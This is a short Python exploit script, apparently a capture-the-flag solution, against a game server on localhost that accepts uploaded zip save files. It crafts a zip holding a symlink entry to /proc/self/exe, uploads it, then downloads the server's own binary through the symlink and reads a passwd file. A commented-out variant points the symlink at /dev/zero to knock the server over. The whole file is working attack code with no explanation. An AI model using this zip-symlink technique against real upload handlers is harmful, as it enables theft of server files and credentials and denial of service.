#!/usr/bin/env python3

import io
import zipfile
import requests
import stat

BASE_URL = 'http://localhost:8080'

def new_game():
    r = requests.get(BASE_URL + '/start', allow_redirects=False)
    game_id = r.headers['Location'].split('=', 1)[1]
    return game_id

def read_file(game_id, filename):
    r = requests.get(BASE_URL + f'/images/{game_id}/{filename}')
    return r.text
    

stream=True

game1 = new_game()

print(read_file(game1, 'config.json'))

zipdata = io.BytesIO()
with zipfile.ZipFile(zipdata, 'w') as ziparchive:
    ziparchive.writestr(f'config.json', '{"abc":"123"}')

    zipInfo = zipfile.ZipInfo('exe')
    zipInfo.create_system = 3
    unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    zipInfo.external_attr = unix_st_mode << 16
    #ziparchive.writestr(zipInfo, '/dev/zero') # DoS server
    ziparchive.writestr(zipInfo, '/proc/self/exe')
zipdata.seek(0)

r = requests.get(BASE_URL + '/resume', files={'save': ('lol.zip', zipdata.getvalue())}, allow_redirects=False)
print(r.text)
game2 = r.headers['Location'].split('=', 1)[1]

#read_file(game2, 'config.json')
with open('server.bin', 'wb') as fout:
    r = requests.get(BASE_URL + f'/images/{game2}/exe', stream=True)
    fout.write(r.raw.read())
    
print(read_file(game2, 'passwd'))
print(read_file(game1, 'config.json'))
